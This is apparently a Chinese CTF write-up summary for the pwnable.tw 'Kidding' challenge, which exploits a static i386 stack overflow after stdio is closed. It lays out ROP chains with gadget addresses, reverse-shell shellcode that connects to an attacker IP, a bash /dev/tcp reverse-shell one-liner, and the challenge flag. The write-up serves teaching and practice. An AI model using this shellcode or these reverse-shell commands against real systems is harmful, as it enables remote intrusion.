---
tags:
  - stack-buffer-overflow
  - rop
  - seccomp-bypass
  - reverse-shell
platform: pwnable.tw
points: 300
arch: i386
libc: static
relro: partial
canary: no
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "静态二进制在标准流被关闭的情况下存在栈溢出，需构造 ROP 链建立反向 socket 连接才能取回 flag。"
proof-of-concept: no
---

# Kidding — pwnable.tw（300 分）

[← 返回 pwnable.tw 题目索引](README.md)

> `nc chall.pwnable.tw 10303`
>
> Flag: `FLAG{Ar3_y0u_k1dd1ng_m3}`

## 题目概览

一个静态链接的 i386 二进制，栈溢出本身很平凡——但有个狠招：`main()` 在**返回之前**调用 `close(0); close(1); close(2)`，把三个标准 I/O 文件描述符全关了。劫持返回地址之后既没有 stdin/stdout/stderr，也没有第二次读取——所有东西都必须塞进最初那次 100 字节的 `read(0, buf, 0x64)` 里。

flag 不能直接 `cat`：`/home/flag/I_am_fl4g` 属于用户 `flag`，必须通过 setuid 辅助程序 `/home/flag/get_flag` 交互式获取（`echo ./I_am_fl4g | ./get_flag`）。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO
  Stack:    No canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)
  Type:     Statically linked
```

## 漏洞

### V1 — 栈缓冲区溢出（距保存的 EIP 仅 12 字节）

**根因：** `main()` 最多读 `0x64`（100）字节到 `ebp-8` 处的 8 字节栈缓冲区，到保存的返回地址只有 12 字节距离，返回地址之后还有约 88 字节用于 ROP/shellcode。

```asm
; main (simplified)
sub    esp, 0x10           ; allocate 16 bytes (buf at ebp-8)
push   0x64                ; count = 100
lea    eax, [ebp-0x8]      ; buf
push   eax
push   0x0                 ; fd = stdin
call   read                ; read(0, ebp-8, 0x64)

; ... close(0); close(1); close(2); ...
leave
ret                        ; hijacked return address
```

**布局：**

```text
[ebp-8]  buf (8 bytes)
[ebp]    saved EBP (4 bytes)  ← 12 bytes padding total
[ebp+4]  saved EIP            ← overflow target
[ebp+8]  ... ~88 bytes of ROP + shellcode space
```

**约束：** `main` 关掉三个文件描述符之后，程序**没有任何 I/O**。利用必须仅凭这一条 100 字节 payload 建立新的通信通道（反向 TCP shell）。

## 关键符号（No PIE，静态链接）

| 符号 | 地址 | 用途 |
|--------|---------|---------|
| `__stack_prot` | `0x080e9fec` | 运行时栈保护标志（设为 7 = RWX） |
| `__libc_stack_end` | `0x080e9fc8` | 指向栈顶的指针（传给 `_dl_make_stack_executable`） |
| `_dl_make_stack_executable` | `0x0809a080` | 调用 `mprotect` 使栈可执行 |
| `_dl_make_stack_executable_hook` | `0x080ea9f4` | 函数指针，自增后可调到上面的函数 |
| `mprotect` | `0x0806dd40` | 直接的 `mprotect` 系统调用封装 |
| `jmp esp` | `0x080bd13b` | 跳到 ROP 链之后 shellcode 的 gadget |
| `push esp; ret` | `0x080b8546` | `jmp esp` 的替代方案 |

## 利用路径

所有解法总体结构一致：**让栈可执行 → `jmp esp` → 反向 shell shellcode**。差别在于如何让栈可执行、以及如何应对 fd 全关的 I/O 问题。

---

### 路径 A — `_dl_make_stack_executable` + `jmp esp` + 反向 shell（最常见）

**相关题解：** 约 80% 的解法（8、59、81、186、278、370、550、821、1074、1351、1986、3498、6247、7905、10128、21778、29544、35463、exp.py）

**ROP 链（36 字节）：**

```python
# Set __stack_prot = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
rop  = p32(POP_EDX) + p32(__stack_prot)
rop += p32(POP_EAX) + p32(7)
rop += p32(MOV_PTR_EDX_EAX)          # [__stack_prot] = 7
# Call _dl_make_stack_executable(&__libc_stack_end)
rop += p32(POP_EAX) + p32(__libc_stack_end)
rop += p32(_dl_make_stack_executable)
rop += p32(JMP_ESP)                   # jump into shellcode below
```

**第一段 shellcode（约 52 字节，跑在此时已可执行的栈上）：**

由于 fd 0/1/2 均已关闭，`socket()` 会返回 fd 0（最小的可用值）。shellcode 依次：
1. `socket(AF_INET, SOCK_STREAM, 0)` → 返回 fd 0
2. `connect(0, {attacker_ip, attacker_port}, 16)` → 建立反向 TCP 连接
3. 二选一：
   - `read(0, esp, large_size)` → 从 socket 读第二段 shellcode，再 `jmp esp` / `call ecx` 跳进去
   - 直接 `execve("/bin/sh", NULL, NULL)`（shell 的 stdin 来自 fd 0 的 socket，但没有 stdout）

```asm
; Typical stage-1: socket + connect + read stage-2
push 0x66          ; sys_socketcall
pop  eax
push 0x1           ; SYS_SOCKET
pop  ebx
xor  edx, edx
push edx           ; protocol = 0
push ebx           ; SOCK_STREAM = 1
push 0x2           ; AF_INET = 2
mov  ecx, esp
int  0x80          ; socket() → fd 0

mov  al, 0x66      ; sys_socketcall
push ATTACKER_IP   ; sin_addr (network order)
push PORT_AND_AF   ; sin_port (BE) + AF_INET
mov  ecx, esp
push 0x10          ; addrlen = 16
push ecx           ; sockaddr *
push edx           ; sockfd = 0
mov  ecx, esp
inc  ebx           ; ebx = 3 = SYS_CONNECT
int  0x80          ; connect()

mov  al, 0x3       ; sys_read
xor  ebx, ebx      ; fd = 0
mov  ecx, esp       ; buf = stack
mov  dl, 0x40       ; count
int  0x80           ; read stage-2
jmp  ecx            ; execute stage-2
```

**第二段 shellcode（经 socket 发送）：**

```asm
; dup2(0, 1); dup2(0, 2); execve("/bin/sh", NULL, NULL)
push 0x3f; pop eax; xor ebx, ebx; push 1; pop ecx; int 0x80  ; dup2(0, 1)
push 0x3f; pop eax; xor ebx, ebx; push 2; pop ecx; int 0x80  ; dup2(0, 2)
xor eax, eax; push eax
push 0x68732f2f; push 0x6e69622f  ; "//sh", "/bin"
mov ebx, esp; xor ecx, ecx; cdq
mov al, 0xb; int 0x80              ; execve("/bin/sh")
```

**路径 A 内部的变体：**

- **单段 execve（不做 dup2）：** 部分解法跳过第二段读取，在 `connect` 之后直接 `execve("/bin/sh")`。这种 shell 的 stdin 来自 socket（fd 0）但没有 stdout。随后在第一个 shell 里执行 `bash -c "bash -i >& /dev/tcp/attacker/port2 0>&1"`，从内部再拉起一个带完整 I/O 的反向 shell。
- **两个独立监听端口：** 一个端口用于最初的回连，另一个端口给从第一个 shell 内部 spawn 的 `bash` 反向 shell。
- **用 `push ebp` 拼 "/bin"：** 部分解法在溢出时把 `/bin` 存进 `ebp`（覆盖保存的 EBP），shellcode 里用 `push ebp` 拼出 `/bin/sh` 字符串，省字节。
- **Bore/ngrok 隧道：** 处于 NAT 后的攻击者会用 `bore.pub` 或 `ngrok` 把本地端口暴露到公网。

---

### 路径 B — 直接 `mprotect` + 反向 shell

**相关题解：** 14、81、363、664、1074（变体）

这些解法不用 `_dl_make_stack_executable`，而是直接对 BSS 或栈所在的页调用 `mprotect`。这会多消耗 ROP 字节，但省去 `__stack_prot` / `__libc_stack_end` 的准备工作。

```python
# mprotect(addr, 0x1000, 7)
rop  = p32(mprotect_addr)
rop += p32(POP3_RET)         # pop ebx; pop esi; pop edi; ret
rop += p32(page_addr)        # addr (BSS or stack page)
rop += p32(0x1000)           # len
rop += p32(7)                # prot = RWX
# ... pivot or jmp to shellcode
```

部分解法对 BSS 页做 `mprotect`，再用 `strcpy`/`memcpy`/`rep movsd` 把 shellcode 拷过去，然后跳过去执行。这样无需知道确切的栈地址，但要多花 ROP gadget，payload 更紧。

---

### 路径 C — 纯 ROP（不用 shellcode）

**相关题解：** 14（第二段）、1074（服务端）

这些解法不把栈改成可执行，而是仅用 ROP gadget 完成整个 `socket → connect → read` 流程（第一段不需要执行 shellcode）。随后经 socket 发送的第二段 payload 用 ROP 链调用 `dup2` 和 `execve`。

该方案在 100 字节预算内要精打细算得多——解法 14 用极度压缩的 ROP，配合计算出的寄存器值和 `stosd` gadget 在运行时拼出 sockaddr 结构体。

---

### 路径 D — 自增 `_dl_make_stack_executable_hook`

**相关题解：** 13204、21778

这些解法不向 `__stack_prot` 写 7 再直接调 `_dl_make_stack_executable`，而是：
1. 把 `ebp` 置为 `__libc_stack_end - 0x18`（这样 `_dl_make_stack_executable` 能读到正确的值）
2. 自增 `_dl_make_stack_executable_hook`，使其指向真实函数
3. 经 hook 调用

这样用 `inc dword ptr [ecx]; ret` 替代 `pop edx; pop eax; mov [edx], eax; ret` 序列，省下几个字节。

```python
rop += p32(POP_ECX) + p32(_dl_make_stack_executable_hook)
rop += p32(INC_DWORD_ECX)     # increment the hook pointer
rop += p32(0x080937f0)        # call through the hook
rop += p32(JMP_ESP)
```

---

### 路径 E — 在 ROP 中直接用 `sys_socket`/`sys_connect` 系统调用

**相关题解：** 35463

使用较新的 Linux 系统调用号（`sys_socket` = 0x167、`sys_connect` = 0x16a），替代多路复用的 `sys_socketcall`（0x66）。这样免去 `socketcall` 需要的嵌套参数指针准备，可以更紧凑一些。

## 利用原语总结

| 原语 | 技术 | 字节数 |
|-----------|-----------|-------|
| 栈可执行 | `_dl_make_stack_executable` | 约 36 字节 ROP |
| 栈可执行 | 直接调 `mprotect` | 约 24-32 字节 ROP |
| 栈可执行 | hook 自增技巧 | 约 28 字节 ROP |
| 反向 TCP（第一段） | `socketcall(socket)` + `socketcall(connect)` + `read` | 约 48-52 字节 shellcode |
| 反向 TCP（第一段） | `sys_socket` + `sys_connect` + `read`（直接系统调用） | 约 40-48 字节 shellcode |
| 完整 shell（第二段） | `dup2(0,1)` + `dup2(0,2)` + `execve("/bin/sh")` | 约 30-40 字节 shellcode |
| 完整 shell（无第二段） | `execve("/bin/sh")` + 内部再起 bash 反向 shell | 单段但需两个监听端口 |

## 偏移（静态二进制，No PIE）

```python
# ROP gadgets
POP_EAX        = 0x080b8536   # pop eax; ret
POP_EDX        = 0x0806ec8b   # pop edx; ret
POP_ECX        = 0x080583c9   # pop ecx; ret
MOV_PTR_EDX    = 0x0805462b   # mov dword ptr [edx], eax; ret
JMP_ESP        = 0x080bd13b   # jmp esp
PUSH_ESP_RET   = 0x080b8546   # push esp; ret

# Key symbols
__stack_prot                 = 0x080e9fec
__libc_stack_end             = 0x080e9fc8
_dl_make_stack_executable    = 0x0809a080
_dl_make_stack_executable_hook = 0x080ea9f4
mprotect                     = 0x0806dd40

# Syscall
INT_0x80       = 0x0806c825   # int 0x80
SYSCALL        = 0x0806f290   # int 0x80; ret (alternative)
```

## 获取 flag

flag 文件 `/home/flag/I_am_fl4g` 不对其他用户可读。setuid 辅助程序 `/home/flag/get_flag` 会从 stdin 读一个路径，与 `"./I_am_fl4g"` 比较，通过则打印 flag：

```bash
cd /home/flag && echo ./I_am_fl4g | ./get_flag
# → "Here is your flag: FLAG{Ar3_y0u_k1dd1ng_m3}"
```

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|-------------|---------------|-------|
| `8.md` | A | `_dl_make_stack_executable` + 两段反向 shell | 干净的双脚本做法 |
| `14.md` | C | 纯 ROP socket+connect+read；第二段用 ROP 做 `execve` | 第一段无 shellcode |
| `59.md` | A | `_dl_make_stack_executable` + 反向 shell + bash 第二 shell | 用 `ebp` = `/bin` 技巧 |
| `81.md` | A | `_dl_make_stack_executable` + 第一段+第二段 | 标准双监听端口方案 |
| `186.md` | A | `_dl_make_stack_executable` + 单段 `execve` | 只有 stdin 的反向 shell + bash 补 stdout |
| `278.md` | A（Ruby） | 用 `or [eax-7], ebp` gadget 设 `__stack_prot` | 少见的 gadget；用 `exec >&0` 补 stdout |
| `363.md` | B | 对 BSS `mprotect` + `rep movsd` 拷贝 + 反向 shell | 把 shellcode 拷到 BSS 页 |
| `370.md` | A | `_dl_make_stack_executable` + 回连 + 返回 main | 两段：第一段返回 main 等第二份 payload |
| `550.md` | A | `_dl_make_stack_executable` + `dup2` + `connect` + `execve` | 全部合成一段，端口 512 技巧 |
| `664.md` | B | 对栈 `mprotect` + 用 `stosd` gadget 走 socketcall | 运行时经 `stosd` 拼 sockaddr |
| `821.md` | A | `_dl_make_stack_executable` + 回连 + 经 0x167/0x16a syscall 做 `dup2(0,1)` | 用直接 socket 系统调用 |
| `1074.md` | C + A | 第一段 ROP 做 `socket+connect+read`；第二段 ROP 链做 `dup2+execve` | 两段全是纯 ROP |
| `1351.md` | A | 标准 `_dl_make_stack_executable` | 干净最小脚本 |
| `1986.md` | A | `_dl_make_stack_executable` + `read(esp)` + 第二段 | 两段，第二段经 socket 读取 |
| `3498.md` | A | `_dl_make_stack_executable` + `pop dword [ecx]` gadget | 用 `pop dword [ecx]; ret` 写 `__stack_prot` |
| `6247.md` | B | 对 BSS `mprotect` + `strcpy` + `add esi, ecx; jmp ebx` 迁移 | 经 strcpy 链把 shellcode 拷到 BSS |
| `7905.md` | A | 标准 + `push esp; ret` 变体 | 干净的双文件利用 |
| `10128.md` | A | `mov eax, 7` gadget + `push esp; ret` | 用 `mov eax, 7` 立即数省字节 |
| `13204.md` | D | 自增 `_dl_make_stack_executable_hook` | 经 hook 间接调用省 ROP 字节 |
| `21778.md` | D | hook 自增 + 第一段内 `dup2` | 同样的 hook 技巧，shellcode 略有不同 |
| `29544.md` | A | 标准 + 直接用 `sys_socket`/`sys_connect` | 使用较新的系统调用号 |
| `35463.md` | E | `mprotect` + 直接 `sys_socket`/`sys_connect` | 为隧道域名做 DNS 解析 |

## 文件

| 文件 | 说明 |
|------|-------------|
| `exp.py` | 可用利用脚本（stdlib socket，bore 隧道） |
| `desc.txt` | 题目描述 |
| `artifacts/` | 原始题目二进制 |
| `tools/` | Bore 隧道客户端二进制 |
| `solution/*.md` | 社区题解文章（67 个解法） |
